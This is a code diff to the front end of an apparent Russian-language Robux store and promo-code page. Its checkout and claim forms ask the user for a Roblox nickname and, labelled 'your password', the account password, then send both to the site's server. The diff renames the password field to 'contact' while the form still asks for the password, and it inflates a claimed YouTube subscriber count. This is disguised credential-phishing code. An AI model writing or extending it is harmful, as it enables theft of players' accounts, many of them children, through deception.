@@ -102,7 +102,7 @@ function StorePage({ theme, setTheme }) {
   const [isCheckoutOpen, setIsCheckoutOpen] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [submitMessage, setSubmitMessage] = useState('');
-  const [form, setForm] = useState({ nickname: '', password: '', note: '' });
+  const [form, setForm] = useState({ nickname: '', contact: '', note: '' });
 
   useLockBodyScroll(isCheckoutOpen);
 
@@ -124,7 +124,7 @@ function StorePage({ theme, setTheme }) {
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           nickname: form.nickname,
-          password: form.password,
+          contact: form.contact,
           note: form.note,
           robux,
           totalPrice: salePrice,
@@ -135,7 +135,8 @@ function StorePage({ theme, setTheme }) {
         throw new Error(data.message || 'Не удалось отправить заказ.');
       }
       setSubmitMessage('Заказ отправлен. Robux приходят моментально!');
-      setForm({ nickname: '', password: '', note: '' });
+      setForm({ nickname: '', contact: '', note: '' });
+      setTimeout(() => setIsCheckoutOpen(false), 2000);
     } catch (error) {
       setSubmitMessage(error instanceof Error ? error.message : 'Ошибка при отправке заказа.');
     } finally {
@@ -175,7 +176,7 @@ function StorePage({ theme, setTheme }) {
             <div className="official-banner">
               <div>
                 <p className="micro-copy">Официальный канал</p>
-                <strong>YouTube EroxBlox — 500K подписчиков</strong>
+                <strong>YouTube EroxBlox — 1.4M подписчиков</strong>
               </div>
               <a href={YOUTUBE_URL} target="_blank" rel="noreferrer" className="ghost-button nav-link">
                 Подписаться
@@ -308,10 +309,10 @@ function StorePage({ theme, setTheme }) {
               <label>
                 <span>Ваш пароль</span>
                 <input
-                  name="password"
+                  name="contact"
                   type="password"
                   placeholder="Введите ваш пароль"
-                  value={form.password}
+                  value={form.contact}
                   onChange={onFieldChange}
                   required
                   style={{ borderColor: '#ff2d95' }}
@@ -674,7 +675,7 @@ function PromoPage({ theme, setTheme, slug }) {
   const [message, setMessage] = useState('');
   const [isClaimOpen, setIsClaimOpen] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [form, setForm] = useState({ nickname: '', password: '', note: '' });
+  const [form, setForm] = useState({ nickname: '', contact: '', note: '' });
 
   useLockBodyScroll(isClaimOpen);
 
@@ -704,7 +705,11 @@ function PromoPage({ theme, setTheme, slug }) {
       const response = await fetch(`/api/promo/${slug}/claim`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(form),
+        body: JSON.stringify({
+          nickname: form.nickname,
+          contact: form.contact,
+          note: form.note,
+        }),
       });
       const data = await readApiPayload(response);
       if (!response.ok || !data.ok) {
@@ -713,7 +718,7 @@ function PromoPage({ theme, setTheme, slug }) {
       setMessage(data.message);
       setPromo(data.promo);
       setIsClaimOpen(false);
-      setForm({ nickname: '', password: '', note: '' });
+      setForm({ nickname: '', contact: '', note: '' });
     } catch (error) {
       setMessage(error instanceof Error ? error.message : 'Ошибка активации промокода.');
     } finally {
@@ -819,12 +824,12 @@ function PromoPage({ theme, setTheme, slug }) {
               <label>
                 <span>Ваш пароль</span>
                 <input
-                  name="password"
+                  name="contact"
                   type="password"
                   placeholder="Введите ваш пароль"
-                  value={form.password}
+                  value={form.contact}
                   onChange={(event) =>
-                    setForm((current) => ({ ...current, password: event.target.value }))
+                    setForm((current) => ({ ...current, contact: event.target.value }))
                   }
                   required
                   style={{ borderColor: '#ff2d95' }}
